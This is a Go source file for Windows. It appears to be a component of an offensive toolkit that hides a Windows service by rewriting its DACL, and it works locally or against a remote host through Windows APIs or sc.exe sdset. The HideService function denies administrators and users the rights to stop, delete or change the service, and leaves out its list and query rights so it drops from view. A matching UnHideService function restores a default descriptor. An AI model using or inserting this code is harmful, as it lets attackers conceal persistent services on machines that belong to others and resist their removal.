//go:build windows

// Package service provides Windows service hiding via DACL manipulation.
package service

import (
	"errors"
	"fmt"
	"os/exec"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

// Mode selects the method used to apply the security descriptor.
type Mode int

const (
	// NATIF uses Windows DLLs directly.
	NATIF Mode = iota
	// SC_SDSET uses the sc.exe SDSET command.
	SC_SDSET
)

// ScSdset applies a DACL to a service using sc.exe SDSET.
func ScSdset(hostname string, svc any, secDescStr string) (string, error) {
	var svcName string
	switch v := svc.(type) {
	case *mgr.Service:
		svcName = v.Name
	case string:
		svcName = v
	default:
		return "", errors.New("unknown arg svc")
	}

	var args []string
	if hostname != "" {
		args = append(args, fmt.Sprintf(`\\%s`, hostname))
	}

	args = append(args, "sdset", svcName, secDescStr)

	cmd := exec.Command("sc.exe", args...)
	str, err := cmd.CombinedOutput()
	return string(str), err
}

// SetServiceSecurityDescriptor applies a DACL to a service using Windows APIs.
func SetServiceSecurityDescriptor(hostname string, svc any, secDescStr string) error {
	var svcName string
	switch v := svc.(type) {
	case *mgr.Service:
		svcName = v.Name
	case string:
		svcName = v
	default:
		return errors.New("unknown arg svc")
	}

	secDesc, err := windows.SecurityDescriptorFromString(secDescStr)
	if err != nil {
		return err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(secDesc)))

	dacl, _, err := secDesc.DACL()
	if err != nil {
		return err
	}

	if hostname != "" {
		svcName = `\\` + hostname + `\` + svcName
	}

	return windows.SetNamedSecurityInfo(
		svcName,
		windows.SE_SERVICE,
		windows.DACL_SECURITY_INFORMATION,
		nil,
		nil,
		dacl,
		nil,
	)
}

// HideService hides a Windows service by applying a restrictive DACL.
func HideService(mode Mode, hostname string, svc any) (string, error) {
	secDescStr := "D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCSWLOCRRC;;;IU)(A;;CCSWLOCRRC;;;SU)(A;;CCSWRPWPDTLOCRRC;;;SY)(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;BA)"
	switch mode {
	case NATIF:
		return "", SetServiceSecurityDescriptor(hostname, svc, secDescStr)
	case SC_SDSET:
		return ScSdset(hostname, svc, secDescStr)
	default:
		return "", errors.New("unknown mode")
	}
}

// UnHideService restores the default DACL on a Windows service.
func UnHideService(mode Mode, hostname string, svc any) (string, error) {
	secDescStr := "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
	switch mode {
	case NATIF:
		return "", SetServiceSecurityDescriptor(hostname, svc, secDescStr)
	case SC_SDSET:
		return ScSdset(hostname, svc, secDescStr)
	default:
		return "", errors.New("unknown mode")
	}
}
